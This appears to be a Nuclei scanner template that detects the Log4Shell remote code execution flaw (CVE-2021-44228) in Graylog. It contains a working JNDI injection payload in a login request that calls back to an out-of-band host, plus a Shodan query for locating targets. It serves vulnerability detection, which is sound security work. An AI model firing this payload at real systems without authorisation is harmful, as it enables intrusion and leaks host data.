id: graylog-log4j
info:
  name: Graylog (Log4j) - Remote Code Execution
  author: DhiyaneshDK
  severity: critical
  description: Graylog (Log4j) is vulnerable to remote code execution caused by specially
    crafted input that manipulates the Apache Log4j 2 library, allowing attackers
    to execute arbitrary code via LDAP servers.
  reference:
  - https://www.graylog.org/post/graylog-update-for-log4j
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"Graylog Web Interface"
    verified: 'true'
    impact: The vulnerability in Graylog (Log4j) allows for remote code execution
      through attacker-controlled LDAP and other JNDI-related endpoints, which poses
      a significant impact on the security of affected systems.
    recommendation: Update to Apache Log4j2 version 2.15.0 or later to protect against
      remote code execution vulnerabilities in Graylog.
  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
requests:
- raw:
  - 'POST /api/system/sessions HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json

    X-Requested-With: XMLHttpRequest

    X-Requested-By: XMLHttpRequest

    Content-Type: application/json

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}


    {"username":"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: header
    words:
    - 'X-Graylog-Node-Id:'
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
